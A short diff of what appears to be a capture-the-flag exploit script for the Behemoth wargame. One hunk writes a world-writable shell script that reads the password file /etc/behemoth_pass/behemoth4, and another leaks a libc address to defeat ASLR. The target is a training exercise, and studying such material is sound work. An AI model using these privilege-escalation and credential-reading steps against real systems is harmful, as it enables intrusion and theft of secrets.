@@ -37,7 +37,7 @@ def start():
       "cd /tmp",
       r"cd $(mktemp -d)",
       "pwd",
-      r"echo -e '#!/bin/sh\ncat /etc/behemoth_pass/behemoth4' >> Identify",
+      r"echo -e '#!/bin/sh\n/bin/cat /etc/behemoth_pass/behemoth4' >> Identify",
       "chmod 777 Identify",
       "chmod 777 ."]
 
@@ -109,7 +109,7 @@ if not args.NOASLR:
   __libc_start_main_246 = int(io.recv(8), 16)
   outputs.append(hex(__libc_start_main_246))
 else:
-  __libc_start_main_246 = 0xf7e2a286 # without ASLR
+  __libc_start_main_246 = 0xf7e2a286 # without ASLR for debugging purposes
 
 io.recvline() # clear io buffer after printf
 
